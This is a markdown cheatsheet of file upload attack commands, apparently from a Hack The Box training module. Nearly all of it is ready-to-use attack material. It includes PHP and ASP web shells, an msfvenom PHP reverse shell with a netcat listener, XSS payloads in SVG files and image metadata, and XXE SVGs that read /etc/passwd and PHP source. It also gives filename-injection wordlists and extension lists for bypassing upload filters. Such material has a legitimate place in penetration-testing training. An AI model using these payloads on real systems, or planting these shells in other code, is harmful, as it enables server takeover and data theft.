# File Upload Attack Commands Cheatsheet

## Web Framework Identification
```bash
# Check for PHP by visiting index page with extension
# Visit: http://SERVER_IP:PORT/index.php

# Use file command to check MIME type
file filename.ext
```

## Creating Basic Test Files
```bash
# Create basic PHP test
echo '<?php echo "Hello HTB";?>' > test.php

# Create simple web shell
echo '<?php system($_REQUEST["cmd"]); ?>' > shell.php
```

## Magic Bytes / MIME Type Testing
```bash
# Create text file and check MIME type
echo "this is a text file" > text.jpg
file text.jpg

# Add GIF magic bytes
echo "GIF8" > text.jpg
file text.jpg
```

## Extension Fuzzing
```bash
# Download PHP extensions wordlist
wget https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/Upload%20Insecure%20Files/Extension%20PHP/extensions.lst

# Download content-type wordlist and filter for images
wget https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Discovery/Web-Content/web-all-content-types.txt
cat web-all-content-types.txt | grep 'image/' > image-content-types.txt
```

## Character Injection Wordlist Generation
```bash
# Generate filename permutations with special characters
for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' '…' ':'; do
    for ext in '.php' '.phps'; do
        echo "shell$char$ext.jpg" >> wordlist.txt
        echo "shell$ext$char.jpg" >> wordlist.txt
        echo "shell.jpg$char$ext" >> wordlist.txt
        echo "shell.jpg$ext$char" >> wordlist.txt
    done
done
```

## Reverse Shell Generation
```bash
# Generate reverse shell with msfvenom
msfvenom -p php/reverse_php LHOST=YOUR_IP LPORT=YOUR_PORT -f raw > reverse.php

# Start netcat listener
nc -lvnp YOUR_PORT
```

## Metadata Manipulation
```bash
# Add XSS payload to image metadata
exiftool -Comment=' "><img src=1 onerror=alert(window.origin)>' HTB.jpg

# Check metadata
exiftool HTB.jpg
```

## Sample Malicious Files

### Basic PHP Web Shell
```php
<?php system($_REQUEST['cmd']); ?>
```

### XSS SVG
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg xmlns="http://www.w3.org/2000/svg" version="1.1" width="1" height="1">
    <rect x="1" y="1" width="1" height="1" fill="green" stroke="black" />
    <script type="text/javascript">alert(window.origin);</script>
</svg>
```

### XXE SVG (File Read)
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<svg>&xxe;</svg>
```

### XXE SVG (PHP Source Code)
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
<svg>&xxe;</svg>
```

### ASP Web Shell
```asp
<% eval request('cmd') %>
```

## Common Bypass Extensions
- PHP: .php, .php3, .php4, .php5, .php7, .phps, .pht, .phtml, .shtml
- Double extensions: .php.jpg, .php.png, .php.gif
- Case variations: .pHp, .PhP, .PHP

## Special Characters for Injection
- %20 (space)
- %0a (line feed)
- %00 (null byte) - works on PHP < 5.3.4
- %0d0a (CRLF)
- / (forward slash)
- .\\ (backslash)
- . (dot)
- … (ellipsis)
- : (colon) - works on Windows

## Windows Reserved Names
- CON, COM1, COM2, COM3, COM4, COM5, COM6, COM7, COM8, COM9
- LPT1, LPT2, LPT3, LPT4, LPT5, LPT6, LPT7, LPT8, LPT9
- AUX, PRN, NUL
